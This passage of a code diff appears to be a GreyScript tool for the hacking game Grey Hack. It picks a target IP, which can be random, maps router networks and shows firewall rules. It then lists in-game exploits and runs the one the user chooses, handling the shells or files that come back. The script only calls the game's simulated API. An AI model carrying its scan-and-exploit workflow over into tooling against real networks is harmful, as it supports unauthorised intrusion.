+	r3.shuffle
+	ok3 = str(r3.pull)
+	r4 = range(1, 255)
+	r4.shuffle
+	ok4 = str(r4.pull)
+	return (ok1 + "." + ok2 + "." + ok3 + "." + ok4)
+end function
+
+//	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/
+//	//////////////////////////////// M A I N //////////////////////////////////
+//	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/	/
+
+// Var //
+shell = get_shell
+host = get_shell.host_computer
+//BDFolder = "/lib/Exploits/"
+BDFolder = current_path + "/Exploits/"
+initERRORpause = 0.1
+flag_m = false
+flag_r = false
+flag_i = false
+
+
+// Init //
+if params.len != 0 and (params[0] == "-h" or params[0] == "--help") then exit("<B><program> <flags> <address> |Flags:-h(Help);-m(NoMap);-r(RandomIp);-i(info)</B>")
+clear_screen
+print("Wait...")
+LibX = includeLib("metaxploit.so")
+LibC = includeLib("crypto.so")
+if prm.check("-m") then flag_m = true
+if prm.check("-r") then flag_r = true
+if prm.check("-i") then flag_i = true
+ipAddr = null
+ipAddr = prm.get_ip()
+if not ipAddr then
+	ipAddr = host.network_gateway
+	if ipAddr == "0.0.0.0" then
+		ipAddr = host.local_ip
+	end if
+end if
+if flag_r then ipAddr = get_randomIp()
+flag_is_lan_ip = is_lan_ip(ipAddr)
+flag_TargetRouter = false
+flagTargetSwitch = false
+if getRouter(ipAddr) then flag_TargetRouter = true
+if get_switch(ipAddr) then flagTargetSwitch = true
+//kdlif()
+info("flag_is_lan_ip: " + flag_is_lan_ip)
+info("flag_TargetRouter: " + flag_TargetRouter)
+info("getRouter(ipAddr): " + getRouter(ipAddr))
+info("typeof(getRouter(ipAddr)): " + typeof(getRouter(ipAddr)))
+if flag_TargetRouter then
+	if not flag_m then lanMap = createRouterMap(getRouter(ipAddr))
+	metaLibs = extractMetaLibs(getRouter(ipAddr))
+else
+	metaLibs = extractMetaLibs(ipAddr)
+end if
+wait(initERRORpause)
+
+// Main cycle //
+while 1
+	clear_screen
+	info("flag_is_lan_ip: " + flag_is_lan_ip)
+	info("flag_TargetRouter: " + flag_TargetRouter)
+	if flag_TargetRouter then
+		info("firewall_rules")
+		if not getRouter(ipAddr).firewall_rules() then print("No firewall_rules")
+		for i in getRouter(ipAddr).firewall_rules()
+			print(i)
+		end for
+		print()
+	end if
+	if flag_TargetRouter and not flagTargetSwitch and not flag_m then print(lanMap)
+	while 1 // Choise MetaLib
+		metaLib = chooseMetaLib(metaLibs)
+		if not metaLib then exit("<b>You are breathtaking!</b>")
+		exploits = importExploits(metaLib.metaLib)
+		if exploits.len == 0 then
+			ERROR("No exploits for entry point. Try scanning for some.")
+			print("")
+			continue
+		end if
+		break
+	end while
+	while 1	// Choise Exploit
+		choices = ["\n\n<b>Choose exploit to use:</b>"]
+		exploits = importExploits(metaLib.metaLib)
+		for exploit in exploits
+			stringToAdd = "<b>" + exploit.type + "</b>"
+			if exploit.hasIndex("requirements") then
+				for requirement in exploit.requirements
+					stringToAdd = stringToAdd + "\n       " + requirement
+				end for
+			end if
+			choices.push(stringToAdd)
+		end for
+		choices.push("<i>Return</i>")
+		userChoice = globals.choice.list123(choices, choices.len-1)//Choise
+		if userChoice > exploits.len then break
+		exploit = exploits[userChoice-1]
+		exploitObj = runExploit(exploit, metaLib.metaLib)
+		if typeof(exploitObj) == "shell" or typeof(exploitObj) == "ftpshell" then expShell()
+		if typeof(exploitObj) == "computer" then expComputer()
+		if typeof(exploitObj) == "file" then expFile()
+	end while
+end while
